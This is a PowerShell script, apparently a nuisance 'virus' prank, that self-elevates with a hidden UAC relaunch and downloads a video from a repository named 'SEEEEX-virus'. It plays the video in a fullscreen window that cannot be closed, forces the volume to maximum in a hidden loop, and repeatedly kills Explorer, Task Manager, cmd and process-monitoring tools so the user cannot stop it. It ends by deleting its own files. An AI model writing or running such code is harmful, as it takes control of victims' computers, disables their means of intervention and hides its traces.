# Check if the script is running with Administrator privileges
$IsAdmin = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -match "S-1-5-32-544"

# If not running as Admin, relaunch the script with UAC prompt
If (-not $IsAdmin) {
    # Relaunch the script with UAC prompt
    $arguments = "& '" + $MyInvocation.MyCommand.Definition + "'"
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
    Exit
}
#---------------------------
# 1. Download the Video File
#---------------------------
$ProgressPreference = 'SilentlyContinue'
$tempPath = [System.IO.Path]::GetTempPath()
$videoFile = Join-Path -Path $tempPath -ChildPath "SEX.mp4"
$downloadUrl = "https://raw.githubusercontent.com/ElenaMod/SEEEEX-virus/refs/heads/main/SEX.mp4"  
Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile
#---------------------------------------------------
# 2. Create and Launch a Hidden Volume-Reset Script
#---------------------------------------------------
$volumeScript = @'
Function Show-Message {
    $htmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>SEX!</title>
    <script type="text/javascript">
        window.onload = function() {
            alert("SEX!");
            window.close();
        }
    </script>
</head>
<body>
</body>
</html>
"@

    $tempFile = [System.IO.Path]::GetTempFileName() + ".html"
    [System.IO.File]::WriteAllText($tempFile, $htmlContent)

    Start-Process -WindowStyle Hidden -FilePath "mshta.exe" -ArgumentList $tempFile
    Start-Sleep -Seconds 1
    Remove-Item $tempFile
}

Function Set-Volume {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int] $volume
    )
    # Calculate number of key presses based on desired volume.
    $keyPresses = [Math]::Ceiling($volume / 2)
    $obj = New-Object -ComObject WScript.Shell
    # Mute volume (simulate volume down presses)
    1..50 | ForEach-Object { $obj.SendKeys([char]174) }
    # Increase volume to the specified level.
    for ($i = 0; $i -lt $keyPresses; $i++) {
        $obj.SendKeys([char]175)
    }
}

Function Kill-Processes {
    # List of forbidden processes
    $forbiddenProcesses = @("cmd", "taskmgr", "SystemInformer", "ProcessHacker", "explorer")

    # Get the current PowerShell process ID to avoid killing the script itself
    $currentPID = $PID

    # Kill forbidden processes and show the message
    foreach ($procName in $forbiddenProcesses) {
        $foundProcesses = Get-Process -Name $procName -ErrorAction SilentlyContinue
        if ($foundProcesses) {
            foreach ($proc in $foundProcesses) {
                try {
                    # Forcefully kill the process
                    Stop-Process -Id $proc.Id -Force
                    Write-Host "Successfully killed process: $($proc.Name)"
                } catch {
                    Write-Host "Failed to kill process: $($proc.Name). Error: $_"
                }
            }
        }
    }
}

# Call the Kill-Processes function
Kill-Processes

# Loop forever to keep resetting the volume and killing processes.
while ($true) {
    Set-Volume 100
    Kill-Processes
    Start-Sleep -Seconds 1
}
'@
# Write the volume script to a temporary file.
$tempVolumeScript = Join-Path -Path $tempPath -ChildPath "volume.ps1"
Set-Content -Path $tempVolumeScript -Value $volumeScript
# Start the hidden PowerShell process that runs the volume-reset script in the background.
$volumeProcess = Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempVolumeScript`"" `
    -WindowStyle Hidden -PassThru
#---------------------------------------------------
# 3. Set Up WPF Window to Play the Downloaded Video
#---------------------------------------------------
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="SEX" 
        WindowState="Maximized" 
        WindowStyle="None" 
        ResizeMode="NoResize" 
        AllowsTransparency="True" 
        Background="Transparent" 
        Topmost="True" 
        WindowStartupLocation="CenterScreen">
    <MediaElement Stretch="Fill" Name="VideoPlayer" 
                  LoadedBehavior="Manual" 
                  UnloadedBehavior="Stop"  />
</Window>
"@

$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
$VideoPlayer = $Window.FindName("VideoPlayer")

# Set up the MediaElement with the downloaded video and full volume.
$VideoPlayer.Volume = 100
[uri]$VideoSource = $videoFile
$VideoPlayer.Source = $VideoSource

#---------------------------------------------------
# 3a. Prevent Closing Until Video Ends
#---------------------------------------------------
# Define a flag to track when the video has ended.
$script:videoEnded = $false

# Handle MediaEnded event to detect when the video is over.
$VideoPlayer.Add_MediaEnded({
    $script:videoEnded = $true
    # Close the window automatically when the video finishes.
    $Window.Dispatcher.Invoke( [action]{ $Window.Close() } )
})

# Handle the window closing event to prevent manual closing.
$Window.Add_Closing([System.ComponentModel.CancelEventHandler]{
    param($sender, $e)
    if (-not $script:videoEnded) {
        # Cancel the closing if the video hasn't finished.
        $e.Cancel = $true
    }
})

# Prevent ALT+F4, close, or minimize (Override window closing)
$Window.Add_KeyDown([System.Windows.Input.KeyEventHandler]{
    param($sender, $e)
    if ($e.Key -eq 'F4' -and $e.SystemKey -eq 'Alt') {
        $e.Handled = $true
    }
})

# Prevent user from killing the script through Task Manager
Start-Job -ScriptBlock {
    while ($true) {
        # Kill any taskmgr.exe if it's opened
        $processes = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
        if ($processes) {
            Stop-Process -Name "taskmgr" -Force
        }
        Start-Sleep -Seconds 1
    }
}

# Prevent user from closing explorer, task manager, etc
Start-Job -ScriptBlock {
    while ($true) {
        # Kill explorer.exe if it is running (this hides the taskbar and other system UI)
        $processes = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if ($processes) {
            Stop-Process -Name "explorer" -Force
        }
        Start-Sleep -Seconds 1
    }
}

# Play the video.
$VideoPlayer.Play()

# Display the window (this call blocks until the window is closed).
$Window.ShowDialog() | Out-Null

#---------------------------------------------------
# 4. Clean Up After Video Playback
#---------------------------------------------------
# Stop the hidden volume script process.
Stop-Process -Id $volumeProcess.Id -Force

# Remove the temporary volume script file.
Remove-Item $tempVolumeScript -Force
taskkill /f /im mshta.exe > $null 2>&1
del $videoFile
start explorer.exe
cmd.exe /c "del %temp%\sex.ps1"
